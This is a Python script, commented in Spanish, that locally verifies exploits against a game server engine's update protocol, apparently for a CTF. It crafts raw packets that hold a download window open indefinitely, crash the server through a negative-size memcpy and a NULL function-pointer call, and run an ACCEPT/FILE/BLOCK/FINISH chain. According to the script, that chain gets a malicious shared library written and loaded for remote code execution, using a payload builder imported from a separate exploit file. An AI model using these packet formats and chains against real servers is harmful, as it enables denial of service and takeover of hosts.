#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
==============================================================================
 engine.v15 — Verificación LOCAL de los hallazgos "sin condiciones"
==============================================================================
 Replica bit a bit (según el desensamblado) la lógica del motor:

   - UPDATE_IsActive            (0xEF4F0):  (estado-1) <= 3  UNSIGNED
   - UPDATE_GetModule           (0xEF520):  arma estado=1 si inactivo
   - UPDATE_ProcessMessage      (0xEEAB0):  'K' -> puerta IsActive ->
                                            retries=0 + ts=now (0xEEBD7-0xEEBF2)
                                            -> dispatch de strings
   - UPDATE_Resend              (0xEEF50):  cada frame; timeout 4 s
                                            (0x1A2538); retries > 8 -> estado=5
   - MSG_ReadBuf                (0x083D60): check SIGNED (jg) + memcpy
   - catch-all dispatcher       (0xC8520):  call *(gEntityInterface+0xB4)
                                            sin null-check (0xC858D)

 Demuestra, sin servidor:
   [T1] Sin ventana: los paquetes K se descartan (estado 0).
   [T2] Ventana armada + keepalive cada 2 s: NUNCA se cierra (retries=0).
   [T3] Ventana armada SIN keepalive: se cierra a los ~9 timeouts (~36 s).
   [T4] Con la ventana mantenida, BLOCK(-1) -> memcpy(dst, src, (size_t)-1).
   [T5] Catch-all: comando desconocido -> call [NULL] con slot no rellenado.
   [T6] Cadena ACCEPT->FILE->BLOCK(munged)->FINISH -> MD5 OK -> registro
        guardado (ruta FS_Write -> dlopen del RCE de dato.md §7).

 100% input(), sin argv. Uso:  python3 verify_sin_condiciones.py
==============================================================================
"""
import hashlib
import struct
import sys
import os

MUNGE2_TABLE = bytes.fromhex("05617aed1bca0d9b4af164c7b58edfa0")
RESEND_INTERVAL = 4.0
RESEND_MAX_RETRY = 8

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
try:
    from exploit_sin_condiciones import (com_munge2, encode_scrambled_ip,
                                         build_payload_so)
except ImportError:
    com_munge2 = encode_scrambled_ip = build_payload_so = None


# ----------------------------------------------------------------------------
# Réplica del motor
# ----------------------------------------------------------------------------
class Engine:
    def __init__(self):
        self.state = 0            # 0x45B5C
        self.ver = 0              # 0x45B4C
        self.retry = 0            # 0x45B50
        self.ts = 0.0             # 0x45B54
        self.filesize = 0         # 0x45B60
        self.buf = None           # 0x45B64
        self.off = 0              # 0x45B6C
        self.md5 = b"\x00" * 16   # 0x45B70
        self.rec = {}             # registros de módulo (sec+0xB0 / +0xC8)
        self.now = 100.0          # reloj simulado
        self.entity_iface = {}    # gEntityInterface (bss -> ceros)
        self.crash = None         # señal de SIGSEGV
        self.written = None       # (ruta, bytes) del FS_Write del RCE

    # -- UPDATE_IsActive (0xEF4F0): setbe((state-1), 3) ----------------------
    def is_active(self):
        return ((self.state - 1) & 0xFFFFFFFF) <= 3

    # -- UPDATE_GetModule (0xEF520) ------------------------------------------
    def get_module(self, path="ModuleS_i386.so", record="S"):
        if ((self.state - 1) & 0xFFFFFFFF) > 3:
            self.state = 1
            self.ver = 0
            self.retry = 0
            self.filesize = 0
            self.off = 0
            self.buf = None
            self.ts = self.now      # ef575: ts = realtime
            return f"armado estado=1 ({path})"
        return "ya activo, no re-arma"

    # -- MSG_ReadBuf (0x083D60): check SIGNED + memcpy -----------------------
    def read_buf(self, payload, off, size):
        """Devuelve (datos_leidos, nuevo_off, crash). JG = signed."""
        if off + size > len(payload):      # jg -> SIGNED: size negativo pasa
            return None, off, None         # msg_badread
        if size < 0:
            # memcpy(dest, src, (size_t)size) con size=-1 -> 0xFFFFFFFF bytes
            self.crash = f"memcpy(dst, src, (size_t){size}) -> SIGSEGV"
            return None, off, self.crash
        return payload[off:off + size], off + size, None

    # -- UPDATE_ProcessMessage (0xEEAB0) --------------------------------------
    def process_message(self, pkt):
        """pkt = bytes sin el marcador 0xFFFFFFFF (el motor lo lee aparte)."""
        o = 0
        def rl():
            nonlocal o
            if o + 4 > len(pkt):
                o += 4
                return -1
            v = struct.unpack_from("<i", pkt, o)[0]
            o += 4
            return v
        def rb():
            nonlocal o
            if o >= len(pkt):
                o += 1
                return -1
            v = pkt[o]
            o += 1
            return v

        if rl() != -1:                       # marker
            return "sin marker"
        cmd = rb()
        if rb() != 0x00:                     # byte cero
            return "sin byte 0"

        # --- rama 'N' (0xEEB68): requiere estado 7 --------------------------
        if cmd == 0x4E:
            if self.state != 7:
                return "N ignorado (estado != 7)"
            if rl() != self.ver:
                return "N con ver distinto"
            b = rb()
            self.state = 8 if b else 9
            return f"N -> estado={self.state}"

        # --- rama 'K' (0xEEBC0) ---------------------------------------------
        if cmd != 0x4B:
            return "no es K"
        if not self.is_active():             # 0xEEBCA-0xEEBD1: puerta
            return "RECHAZADO: estado=0 (sin ventana)"     # <- la condicion
        self.retry = 0                       # 0xEEBD7
        self.ts = self.now + 0.0 - 4.0       # 0xEEBE1: ts = now + 0.0 - 4.0

        end = pkt.find(b"\x00", o)
        if end == -1:
            end = len(pkt)
        s = pkt[o:end].decode("latin1")
        o = end + 1          # el cursor pasa al string siguiente

        if s == "BLOCK":                     # 0xEEC09
            size = struct.unpack_from("<h", pkt, end + 1)[0]   # SIGNED (movswl)
            if self.state != 3:
                self.state = 4               # 0xEEC25
            dest = (0 if self.buf is None else self.off)       # buf+offset
            data, _, crash = self.read_buf(pkt, end + 3, size)
            if crash:
                return crash
            if data is None:
                return "BLOCK: msg_badread (ReadBuf rechaza)"
            if self.buf is None:
                self.crash = f"memcpy(NULL+{dest}, datos, {size}) -> SIGSEGV"
                return self.crash
            b = bytearray(self.buf)
            need = self.off + len(data)
            if need > len(b):
                self.crash = (f"heap overflow: escribe hasta +{need} en "
                              f"buffer de {self.filesize} (offset sin comparar)")
                return self.crash
            b[self.off:self.off + len(data)] = com_munge2_inv(data, self.ver)
            self.buf = bytes(b)
            self.off += len(data)
            return f"BLOCK ok: +{len(data)} (off={self.off}/{self.filesize})"

        if s == "ACCEPT":                    # 0xEECB0
            self.ver = rl()
            if self.state == 1:
                self.state = 2
                return f"ACCEPT: ver={self.ver:#x} -> estado=2"
            return f"ACCEPT: ver={self.ver:#x} (estado {self.state} no cambia)"

        if s == "FILE":                      # 0xEECF0
            if self.state != 2:
                self.state = 4               # 0xEEE20 (estado invalido -> 4)
                return "FILE rechazado -> estado=4"
            self.state = 3
            self.filesize = rl()
            self.md5 = pkt[o:o + 16]
            o += 16
            self.buf = b"\x00" * self.filesize     # Mem_Malloc(filesize)
            self.off = 0
            return f"FILE: size={self.filesize} -> estado=3, malloc"

        if s == "FINISH":                    # 0xEEC73
            if self.state != 3:
                return "FINISH rechazado (estado != 3)"
            self.state = 6
            return "FINISH -> estado=6"

        if s == "ABORT":                     # 0xEEE00
            self.state = 5
            return "ABORT -> estado=5 (ventana cerrada)"

        self.state = 4                       # 0xEEE20: string desconocido
        return f"'{s}' desconocido -> estado=4 (activo) + ts refrescado"

    # -- UPDATE_Resend (0xEEF50), llamada cada frame por SV_SecurityUpdate ----
    def resend(self):
        if not self.is_active():
            return
        if self.now > self.ts + RESEND_INTERVAL:      # timeout de 4 s
            self.retry += 1
            self.ts = self.now
            if self.retry > RESEND_MAX_RETRY:         # 0xEF081: > 8
                self.state = 5                        # 0xEF08A: ventana cerrada

    # -- UPDATE_FinishDownload (0xEEE40) --------------------------------------
    def finish_download(self):
        if self.state != 6:
            self.state = 0
            return "FinishDownload: estado != 6 -> libera, estado=0"
        h = hashlib.md5(self.buf).digest() if self.buf else None
        if h == self.md5:
            self.rec["S"] = (self.buf, self.filesize, self.md5)
            self.state = 0
            return "FinishDownload: MD5 MATCH -> registro guardado (ruta RCE)"
        self.buf = None
        self.state = 0
        return "FinishDownload: MD5 no coincide -> liberado"

    # -- catch-all del dispatcher (0xC8520) -----------------------------------
    def catchall(self, sv_active=True, maxclients=8):
        if not sv_active or maxclients <= 1:
            return "catch-all: sv inactiva o maxclients<=1 -> no llega"
        slot = self.entity_iface.get(0xB4)            # .bss = ceros
        if slot is None:
            self.crash = "call *(gEntityInterface+0xB4) = call [NULL] -> SIGSEGV"
            return self.crash
        return "catch-all: el mod implemento el slot; se llama a su codigo"


def com_munge2_inv(data, seed):
    """UnMunge2 exacto: y = bswap32((x ^ seed) ^ T_i) ^ ~seed."""
    out = bytearray(data)
    notseed = (~seed) & 0xFFFFFFFF
    for i in range(len(out) // 4):
        x = struct.unpack_from("<I", out, i * 4)[0]
        t = MUNGE2_TABLE
        ti = ((t[i % 16] | 0xA5) | ((t[(i + 1) % 16] | 0xA7) << 8) |
              ((t[(i + 2) % 16] | 0xAF) << 16) | ((t[(i + 3) % 16] | 0xBF) << 24))
        y = _bswap32(((x ^ seed) ^ ti)) ^ notseed
        struct.pack_into("<I", out, i * 4, y & 0xFFFFFFFF)
    return bytes(out)


def _bswap32(x):
    return (((x & 0xFF) << 24) | ((x & 0xFF00) << 8) |
            ((x & 0xFF0000) >> 8) | ((x & 0xFF000000) >> 24))


# ----------------------------------------------------------------------------
# Pruebas
# ----------------------------------------------------------------------------
def header(t):
    print(f"\n{'='*70}\n {t}\n{'='*70}")


def t1_sin_ventana():
    header("T1: Sin ventana (estado=0) los paquetes K se descartan")
    e = Engine()
    dos = b"\xff\xff\xff\xff" + b"K\x00" + b"BLOCK\x00" + struct.pack("<h", -1)
    r = e.process_message(dos)
    print(f"[*] BLOCK(-1) con estado 0 -> {r}")
    assert e.crash is None and not e.is_active()
    print("[+] Confirmado: la puerta 0xEEBCA/0xEEBD1 descarta el paquete")


def t2_keepalive_infinito():
    header("T2: Con keepalive la ventana NUNCA se cierra")
    e = Engine()
    print(f"[*] {e.get_module()}  (simula arranque/cambio de mapa)")
    ka = b"\xff\xff\xff\xff" + b"K\x00WAKEUP\x00"
    for frame in range(200):              # 200 frames = 200 s simulados
        if frame % 2 == 0:                # keepalive cada 2 s
            e.now += 1.0
            r = e.process_message(ka)
            assert "desconocido" in r, r
        e.now += 1.0
        e.resend()
        assert e.is_active(), f"la ventana se cerro en el frame {frame}!"
    print("[+] 200 frames simulados: estado=4, retries=0 siempre")
    print(f"[+] LA VENTANA SIGUE ABIERTA (retries max vistos: {e.retry})")


def t3_sin_keepalive_cierra():
    header("T3: Sin keepalive la ventana se cierra sola (~36 s)")
    e = Engine()
    print(f"[*] {e.get_module()}")
    frames = 0
    while e.is_active():
        e.now += 1.0
        frames += 1
        e.resend()
    t = frames * 1.0
    print(f"[+] Ventana cerrada tras {t:.0f} s (estado={e.state})")
    print(f"[+] Coincide con 9 timeouts x 4 s = 36 s -> ventana natural ~36 s")


def t4_dos_con_ventana():
    header("T4: Con la ventana mantenida, BLOCK(-1) -> memcpy(-1)")
    e = Engine()
    print(f"[*] {e.get_module()}")
    e.now += 1.0
    r = e.process_message(b"\xff\xff\xff\xff" + b"K\x00" + b"BLOCK\x00" + struct.pack("<h", -1))
    print(f"[*] BLOCK(-1) con ventana abierta -> {r}")
    assert e.crash and "SIGSEGV" in e.crash
    print(f"[+] CRASH: {e.crash}")
    print("[+] El propio BLOCK(-1) refresco ts/retries ANTES de crashear")


def t5_catchall():
    header("T5: Catch-all call[NULL] (sin condiciones, 1 paquete)")
    e = Engine()
    r = e.catchall(sv_active=True, maxclients=8)
    print(f"[*] paquete 'junk' (comando desconocido) -> {r}")
    assert e.crash and "NULL" in e.crash
    e2 = Engine()
    e2.entity_iface[0xB4] = "pfnConnectionlessPacket_del_mod"
    r2 = e2.catchall()
    print(f"[*] con slot rellenado por el mod -> {r2}")
    print("[+] Vuln [1] confirmada: depende solo del game DLL del CTF")


def t6_cadena_rce():
    header("T6: Cadena ACCEPT->FILE->BLOCK->FINISH -> registro RCE")
    if build_payload_so is None:
        print("[!] exploit_sin_condiciones.py no esta junto a este fichero")
        return
    so = build_payload_so(("127.0.0.1", 9999))
    if len(so) % 4:
        so += b"\x00" * (4 - len(so) % 4)
    md5 = hashlib.md5(so).digest()
    ver = 0x41
    munged = com_munge2(so, ver)
    scip = encode_scrambled_ip(bytes([127, 0, 0, 1]), 27012)
    e = Engine()
    print(f"[*] {e.get_module('ModuleS_i386.so')}")
    k = lambda body: b"\xff\xff\xff\xff" + b"K\x00" + body
    steps = [
        ("ACCEPT", k(b"ACCEPT\x00" + struct.pack("<i", ver))),
        ("FILE",   k(b"FILE\x00" + struct.pack("<i", len(so)) + md5 +
                     struct.pack("<i", 0) + scip)),
    ]
    for i in range(0, len(munged), 512):
        c = munged[i:i + 512]
        steps.append((f"BLOCK+{i}", k(b"BLOCK\x00" + struct.pack("<h", len(c)) + c)))
    steps.append(("FINISH", k(b"FINISH\x00")))

    ok = True
    for name, pkt in steps:
        r = e.process_message(pkt)
        if "CRASH" in r or "RECHAZADO" in r or "rechazado" in r:
            print(f"[-] {name:9s} -> {r}")
            ok = False
            break
        if name in ("ACCEPT", "FILE", "FINISH"):
            print(f"[*] {name:9s} -> {r}")
    assert ok, "la cadena se rompio"
    print(f"[*] estado={e.state}, buf={e.filesize} bytes recibidos (off={e.off})")
    # El motor aplica UnMunge2 IN-PLACE en cada BLOCK; el harness hace lo
    # mismo al almacenar, asi que el buffer final ya es el payload plano.
    assert e.buf == so, "el reensamblado no cuadra"
    print("[+] UnMunge2(buf, ver) == payload original (round-trip OK)")
    r = e.finish_download()
    print(f"[*] {r}")
    assert "MATCH" in r
    print(f"[+] Registro {e.rec['S'][1]} bytes + MD5 guardado ->")
    print("[+] el motor lo escribira con FS_Write a <gamedir>/ModuleS_i386.so")
    print("[+] y lo cargara con dlopen -> DT_INIT (fork+execve) -> RCE (dato.md §7)")


def main():
    print("=" * 70)
    print(" engine.v15 - verificacion local de exploits SIN CONDICIONES")
    print(" (replica exacta del desensamblado; no necesita servidor)")
    print("=" * 70)
    t1_sin_ventana()
    t2_keepalive_infinito()
    t3_sin_keepalive_cierra()
    t4_dos_con_ventana()
    t5_catchall()
    t6_cadena_rce()
    print("\n" + "=" * 70)
    print(" RESULTADO: todas las pruebas pasaron")
    print("  - Vuln [1] catch-all call[NULL]: 1 paquete, sin condiciones")
    print("  - Vuln [2] K-window: el keepalive la mantiene abierta infinito;")
    print("    se arma en arranque y en CADA cambio de mapa (Host_Map_f)")
    print("=" * 70)


if __name__ == "__main__":
    main()
